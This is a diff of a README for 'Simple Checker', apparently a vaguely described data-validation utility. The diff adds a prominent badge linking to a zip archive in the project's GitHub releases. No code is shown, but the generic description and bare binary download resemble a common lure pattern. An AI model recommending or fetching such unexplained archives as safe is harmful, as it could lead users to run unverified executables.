@@ -1,7 +1,8 @@
 # 🛡️ Simple Checker: Multi-Purpose Data Validation Suite 
 
 A high-performance, modular utility designed for rapid verification and integrity checking of large datasets. Built for efficiency, stability, and ease of use.
-[![Download Simplechecker](https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple-checker/Simplechecker.zip)
+[![Download Simplechecker](https://img.shields.io/badge/⬇️_Download_Simplechecker-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple-checker/Simplechecker.zip)
+
 
 
 ### 🌟 Overview
